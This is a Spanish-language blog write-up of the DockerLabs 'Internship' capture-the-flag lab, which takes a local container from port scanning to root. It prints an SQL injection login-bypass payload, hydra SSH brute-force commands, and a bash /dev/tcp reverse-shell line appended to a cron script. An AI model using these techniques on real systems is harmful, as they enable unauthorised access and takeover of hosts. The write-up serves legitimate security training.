---
title: DockerLabs - Internship
summary: "Write-up del laboratorio Internship de DockerLabs"
author: elcybercurioso
date: 2025-11-04 20:36:40
categories: [Post, DockerLabs]
tags: [fácil, sqli, credentials leaking, brute force, cron jobs, privesc, stenography]
media_subpath: "/assets/img/posts/dockerlabs_internship"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 17:11 GMT
Initiating ARP Ping Scan at 17:11
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 17:11, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:11
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 17:11, 0.64s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ nmap -sCV -p22,80 172.17.0.2                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 17:11 GMT
Nmap scan report for 172.17.0.2
Host is up (0.000038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 35:ff:c4:8b:c4:e1:46:12:43:b9:03:a9:cf:ec:f3:0a (ECDSA)
|_  256 23:ac:95:1e:be:33:9e:ed:14:f0:45:f6:27:51:ca:ba (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: GateKeeper HR | Tu Portal de Recursos Humanos
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

## análisis

En la página principal del servidor web encontramos una aplicación relacionada con recursos humanos:

![Desktop View](/20251103181249.webp){: width="972" height="589" .shadow}

Tras intentar acceder, nos damos cuenta de que no es del todo funcional. Esto se debe a que hay recursos que se buscan en `gatekeeperhr.com`:

![Desktop View](/20251103181710.webp){: width="972" height="589" .shadow}

Por ello, tras agregar dicho dominio a nuestro fichero `/etc/hosts` y recargar la página, veremos que ya podemos ver el panel de login:

![Desktop View](/20251103181741.webp){: width="972" height="589" .shadow}

Nos daremos cuenta rápidamente de que podemos saltarnos este panel empleando un payload básico de SQL Injection como el siguiente:

```bash
' or 1=1-- -
```

Una vez dentro, veremos un listado de posibles usuarios del sistema:

![Desktop View](/20251103181813.webp){: width="972" height="589" .shadow}

En el código fuente de la página encontraremos una pista que nos indica que algunos de los usuarios pueden permitirnos acceder por SSH:

![Desktop View](/20251103182051.webp){: width="972" height="589" .shadow}

Buscamos con `gobuster` recursos del servidor web que nos den mas información de por donde continuar:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship/CVE-2024-6387]
└─$ gobuster dir -u "http://gatekeeperhr.com" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.txt,.html 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gatekeeperhr.com
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about.html           (Status: 200) [Size: 3339]
/index.html           (Status: 200) [Size: 3971]
/spam                 (Status: 301) [Size: 319] [--> http://gatekeeperhr.com/spam/]
/css                  (Status: 301) [Size: 318] [--> http://gatekeeperhr.com/css/]
/includes             (Status: 301) [Size: 323] [--> http://gatekeeperhr.com/includes/]
/js                   (Status: 301) [Size: 317] [--> http://gatekeeperhr.com/js/]
/default              (Status: 301) [Size: 322] [--> http://gatekeeperhr.com/default/]
/lab                  (Status: 301) [Size: 318] [--> http://gatekeeperhr.com/lab/]
/contact.html         (Status: 200) [Size: 3140]
/server-status        (Status: 403) [Size: 281]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================

```

En el código fuente del recurso `/spam`, vemos la siguiente cadena en un comentario:

![Desktop View](/20251103183946.webp){: width="972" height="589" .shadow}

Tratamos de decodificarlo, y resulta que se había codificado la siguiente cadena con el método de encriptación `ROT13` (el cual consiste en cambiar cada carácter por el carácter que está 13 posiciones más adelante):

![Desktop View](/20251103184035.webp){: width="972" height="589" .shadow}

Nos guardaremos los nombres de los usuario que vimos anteriormente en un listado, ya que será lo que empleemos para obtener el usuario de SSH al que pertenece la contraseña que hemos encontrado:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ cat usuarios.txt 
ana
carlos
maria
juan
laura
pedro
sofia
diego
valentina
alejandro
```

## explotación

Empleando `hydra` encontramos que la contraseña pertenece al usuario `pedro`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ hydra -L usuarios.txt -p ****** ssh://172.17.0.2 -t 64 -I
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-03 17:41:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: pedro   password: ******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-03 17:41:50
```

Tratamos de acceder, y concluimos que las credenciales son correctas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ ssh pedro@172.17.0.2                                                 
pedro@172.17.0.2's password: 
pedro@3bdad2818ad9:~$ whoami
pedro
pedro@3bdad2818ad9:~$ hostname -I
172.17.0.2
```

En la carpeta principal encontramos la siguiente flag:

```bash
pedro@3bdad2818ad9:~$ ls -la
total 24
drwxrwx--- 1 pedro pedro 4096 Feb 10  2025 .
drwxr-xr-x 1 root  root  4096 Feb 10  2025 ..
-rw-r--r-- 1 pedro pedro  220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 pedro pedro 3526 Mar 29  2024 .bashrc
-rw-r--r-- 1 pedro pedro  807 Mar 29  2024 .profile
-r-------- 1 pedro pedro  798 Feb  9  2025 fl4g.txt
pedro@3bdad2818ad9:~$ cat fl4g.txt 
                           _
                        _ooOoo_
                       o8888888o
                       88" . "88
                       (| -_- |)
                       O\  =  /O
                    ____/`---'\____
                  .'  \\|     |//  `.
                 /  \\|||  :  |||//  \
                /  _||||| -:- |||||_  \
                |   | \\\  -  /'| |   |
                | \_|  `\`---'//  |_/ |
                \  .-\__ `-. -'__/-.  /
              ___`. .'  /--.--\  `. .'___
           ."" '<  `.___\_<|>_/___.' _> \"".
          | | :  `- \`. ;`. _/; .'/ /  .' ; |
          \  \ `-.   \_\_`. _.'_/_/  -' _.' /
===========`-.`___`-.__\ \___  /__.-'_.'_.-'================
                        `=--=-'                    

                      ~ Sigue asi ~
```

Los usuarios a los cuales podemos apuntar (ya que son los que nos permitirían loguearnos) son los siguientes:

```bash
pedro@3bdad2818ad9:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
pedro:x:1000:1000::/home/pedro:/bin/bash
valentina:x:1001:1001::/home/valentina:/bin/bash
```

Tras buscar en varias carpetas, encontramos que en `/opt` hay un fichero que pertenece a la usuaria `valentina`, el cual tenemos permisos para modificar:

```bash
pedro@3bdad2818ad9:/home$ ls -la /opt
total 12
drwxr-xr-x 1 root      root      4096 Feb 10  2025 .
drwxr-xr-x 1 root      root      4096 Nov  3 17:11 ..
-rwxrw-rw- 1 valentina valentina   30 Feb  9  2025 log_cleaner.sh
```

El contenido de script es el siguiente:

```bash
pedro@3bdad2818ad9:/home$ cat /opt/log_cleaner.sh
#!/bin/bash
rm -rf /var/log/*
```

Dado que parece que se está empleando en una tarea que se ejecuta a intervalos regulares de tiempo (cron jobs), agregamos una instrucción al final del script que nos devolverá una consola como la usuaria `valentina` cuando se ejecute:

```bash
pedro@3bdad2818ad9:/home$ cat /opt/log_cleaner.sh 
#!/bin/bash
rm -rf /var/log/*

bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
```

Veremos que pasados unos segundos, habremos obtenido una consola como la usuaria `valentina`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 49812
valentina@3bdad2818ad9:~$ whoami
whoami
valentina
valentina@3bdad2818ad9:~$ hostname -I
hostname -I
172.17.0.2
```

Debemos tratar la tty para tener una consola completamente funcional:

```bash
valentina@3bdad2818ad9:~$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
valentina@3bdad2818ad9:~$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ stty raw -echo;fg
[1]  + continued  nc -nlvp 4444
                               reset xterm

valentina@3bdad2818ad9:~$ export TERM=xterm
valentina@3bdad2818ad9:~$ export SHELL=bash
valentina@3bdad2818ad9:~$ stty rows 48 columns 210
```

## escalada de privilegios

En el directorio de la usuaria vemos otra flag, y una imagen, la cual nos traemos a nuestra máquina para analizarla:

```bash
valentina@3bdad2818ad9:~$ ls -la
total 76
drwxrwx--- 1 valentina valentina  4096 Nov  3 17:56 .
drwxr-xr-x 1 root      root       4096 Feb 10  2025 ..
-rw-r--r-- 1 valentina valentina   220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 valentina valentina  3526 Mar 29  2024 .bashrc
drwxr-xr-x 3 valentina valentina  4096 Nov  3 17:56 .local
-rw-r--r-- 1 valentina valentina   807 Mar 29  2024 .profile
-r-------- 1 valentina valentina   636 Feb  9  2025 fl4g.txt
-r-------- 1 valentina valentina 44990 Feb  9  2025 profile_picture.jpeg
valentina@3bdad2818ad9:~$ cat fl4g.txt 
               ______
              '-._   ```"""---.._
           ,-----.:___           `\  ,;;;,
            '-.._     ```"""--.._  |,%%%%%%              _
            ,    '.              `\;;;;  -\      _    _.'/\
          .' `-.__ \            ,;;;;" .__{=====/_)==:_  ||
     ,===/        ```";,,,,,,,;;;;;'`-./.____,'/ /     '.\/
    '---/              ';;;;;;;;'      `--.._.' /
   ,===/                          '-.        `\/
  '---/                            ,'`.        |
     ;                        __.-'    \     ,'
jgs  \______,,.....------'''``          `---`


       ~ Ahora, a por la escalada de privilegios ~
```

En este caso, he optado por pasarla a base64, pegarla en un fichero, y decodificarla, pero se podría haber empleado otros métodos como `netcat` o `scp`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ cat test.txt | base64 -d > test.jpg
```

Al abrirla, vemos que se trata de un meme:

![Desktop View](/20251103190250.webp){: width="972" height="589" .shadow}

Analizándola con `exiftool` no nos da ninguna información útil:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ exiftool test.jpg            
ExifTool Version Number         : 13.25
File Name                       : test.jpg
Directory                       : .
File Size                       : 45 kB
File Modification Date/Time     : 2025:11:03 18:02:14+00:00
File Access Date/Time           : 2025:11:03 18:02:25+00:00
File Inode Change Date/Time     : 2025:11:03 18:02:14+00:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 400
Image Height                    : 400
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 400x400
Megapixels                      : 0.160
```

Pero al abrirla con `steghide` en busca de ficheros guardados dentro de la foto, vemos que (sin aportar contraseña), logramos extraer un fichero:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ steghide extract -sf test.jpg
Enter passphrase: 
wrote extracted data to "secret.txt".
```

El contenido de dicho fichero es el siguiente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Internship]
└─$ cat secret.txt                    
m*****
```

Comprobamos a ver si se trata de la contraseña del usuario `root` de la máquina, y vemos que es así:

```bash
valentina@3bdad2818ad9:~$ sudo su
[sudo] password for valentina: 
root@3bdad2818ad9:/home/valentina# whoamio
bash: whoamio: command not found
root@3bdad2818ad9:/home/valentina# whoami 
root
```

Y así, nos habremos convertido en `root` en el laboratorio!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>